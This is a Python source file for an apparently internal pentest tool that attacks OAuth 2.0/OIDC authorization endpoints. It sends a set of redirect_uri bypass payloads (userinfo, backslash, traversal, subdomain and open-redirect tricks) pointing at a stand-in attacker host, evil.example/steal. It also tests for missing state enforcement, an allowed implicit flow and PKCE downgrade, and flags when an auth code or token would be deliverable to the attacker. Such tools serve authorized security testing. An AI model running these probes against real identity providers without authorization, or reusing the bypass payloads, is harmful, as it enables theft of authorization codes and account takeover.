#!/usr/bin/env python3
"""oauth_abuse.py — OAuth 2.0 / OIDC authorization-flow abuse (INTERNAL).

Probes for sloppy redirect_uri validation, missing state enforcement,
implicit-flow leakage, and PKCE downgrade. Confirmation is differential:
a registered redirect_uri is baselined first; mutations only report when
the server treats them differently.

    python TOOLS/oauth_abuse.py \
      --url "https://id.example.com/authorize?client_id=abc&redirect_uri=https://app.example.com/cb&response_type=code&scope=openid&state=xyz" \
      --attacker https://evil.example/steal
"""
import argparse
import os
import sys
import urllib.error
import urllib.parse
import urllib.request

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from vibe_core import VibeTool, AuthHandler
from privacy_guard import privacy_user_agent


class _NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


class OAuthAbuse(VibeTool):
    def __init__(self, url, attacker):
        super().__init__("OAuth Abuse", "OAuth / OIDC Authorization Flow Abuse")
        self.url = url
        self.attacker = attacker.rstrip("/")
        parsed = urllib.parse.urlparse(url)
        self.base = parsed._replace(query="").geturl()
        self.params = dict(urllib.parse.parse_qsl(parsed.query, keep_blank_values=True))
        self.redirect = self.params.get("redirect_uri", "")
        self.findings = 0
        self.opener = urllib.request.build_opener(_NoRedirect, AuthHandler)

    def _request(self, params):
        url = self.base + "?" + urllib.parse.urlencode(params)
        req = urllib.request.Request(url, headers={"User-Agent": privacy_user_agent("OAuth Abuse")})
        try:
            r = self.opener.open(req, timeout=8)
            return r.getcode(), dict(r.headers), r.read(8000).decode("utf-8", "replace")
        except urllib.error.HTTPError as e:
            return e.code, dict(e.headers), e.read(8000).decode("utf-8", "replace")
        except Exception as e:
            return 0, {}, str(e)

    @staticmethod
    def _is_error(status, headers, body):
        loc = headers.get("Location", "")
        blob = (loc + " " + body[:2000]).lower()
        return any(k in blob for k in ("invalid_request", "invalid redirect",
                                       "redirect_uri_mismatch", "unauthorized_client",
                                       "invalid_redirect_uri", "unregistered",
                                       "error=access_denied", "invalid_scope"))

    def _accepts(self, status, headers, body, needle):
        if self._is_error(status, headers, body):
            return False
        loc = headers.get("Location", "")
        host = urllib.parse.urlparse(needle).netloc
        if loc and host and host in urllib.parse.urlparse(loc).netloc:
            return "redirect"
        if host and host in body:
            return "reflected"
        return False

    def _mutations(self):
        if not self.redirect:
            return []
        legit = self.redirect
        atk = self.attacker or "https://evil.example/steal"
        atk_host = urllib.parse.urlparse(atk).netloc
        legit_host = urllib.parse.urlparse(legit).netloc
        return [
            ("full replace", atk),
            ("subdomain prefix", f"https://{legit_host}.{atk_host}/"),
            ("userinfo trick", f"https://{legit_host}@{atk_host}/"),
            ("path append", legit.rstrip("/") + f".{atk_host}/"),
            ("path traversal", legit.rstrip("/") + f"/../../@{atk_host}/"),
            ("open-redirect suffix", legit + (("&" if "?" in legit else "?") + "next=" + atk)),
            ("backslash trick", f"https://{atk_host}\\@{legit_host}/"),
        ]

    def _test_redirect_uri(self):
        if not self.redirect:
            self.log("No redirect_uri in the supplied URL — skipping redirect_uri tests.", "info")
            return
        base_status, base_headers, base_body = self._request(self.params)
        base_err = self._is_error(base_status, base_headers, base_body)
        self.log(f"Baseline (registered redirect_uri): status={base_status} "
                 f"error={'yes' if base_err else 'no'}")
        for label, value in self._mutations():
            p = dict(self.params)
            p["redirect_uri"] = value
            st, hd, body = self._request(p)
            verdict = self._accepts(st, hd, body, self.attacker or value)
            if verdict:
                how = ("302 Location to attacker host" if verdict == "redirect"
                       else "attacker URL reflected on consent page")
                self.log(f"redirect_uri ACCEPTED — {label}: {how}. "
                         f"Auth code / token deliverable to attacker. ({value})", "hack")
                self.findings += 1
            else:
                self.log(f"  redirect_uri [{label}]: rejected/normalised.", "info")

    def _test_state(self):
        if "state" not in self.params:
            self.log("No state param — cannot test state enforcement.", "info")
            return
        p = dict(self.params)
        p.pop("state", None)
        st, hd, body = self._request(p)
        if not self._is_error(st, hd, body) and (hd.get("Location") or st == 200):
            self.log("state NOT enforced — authorization proceeds without it. "
                     "Callback exposed to login CSRF / code injection.", "crit")
            self.findings += 1
        else:
            self.log("  state appears required — request without it is rejected.", "pass")

    def _test_implicit(self):
        if self.params.get("response_type") == "token":
            return
        p = dict(self.params)
        p["response_type"] = "token"
        st, hd, body = self._request(p)
        if not self._is_error(st, hd, body) and (hd.get("Location") or st == 200):
            self.log("Implicit flow ALLOWED — response_type=token accepted. "
                     "Access tokens ride in URL fragment (referer/history/log leakage).", "warn")
            self.findings += 1
        else:
            self.log("  implicit flow rejected — response_type=token not honoured.", "pass")

    def _test_pkce_downgrade(self):
        if "code_challenge" not in self.params:
            self.log("No code_challenge in URL — PKCE downgrade not applicable.", "info")
            return
        p = dict(self.params)
        p.pop("code_challenge", None)
        p.pop("code_challenge_method", None)
        st, hd, body = self._request(p)
        if not self._is_error(st, hd, body) and (hd.get("Location") or st == 200):
            self.log("PKCE DOWNGRADE — server proceeds without code_challenge. "
                     "Auth-code interception protection can be stripped.", "crit")
            self.findings += 1
        else:
            self.log("  PKCE enforced — request without code_challenge is rejected.", "pass")

    def run(self):
        self.banner()
        self.log(f"Authorize endpoint: {self.base}")
        self.log(f"Attacker sink: {self.attacker or '(none set — using evil.example)'}")
        self._test_redirect_uri()
        self._test_state()
        self._test_implicit()
        self._test_pkce_downgrade()
        self.log("=" * 40)
        if self.findings:
            self.log(f"OAUTH SWEEP COMPLETE — {self.findings} finding(s)", "hack")
        else:
            self.log("No OAuth flaws confirmed.", "pass")
        return 0


def main(argv=None):
    p = argparse.ArgumentParser(description="OAuth Abuse - OAuth/OIDC authorization-flow abuse")
    p.add_argument("--url", required=True,
                   help="Full /authorize URL with client_id, redirect_uri, response_type, state")
    p.add_argument("--attacker", default="")
    p.add_argument("-v", "--version", action="version", version="OAuth Abuse 1.0.0")
    args = p.parse_args(argv)
    return OAuthAbuse(args.url, args.attacker).run()


if __name__ == "__main__":
    raise SystemExit(main())
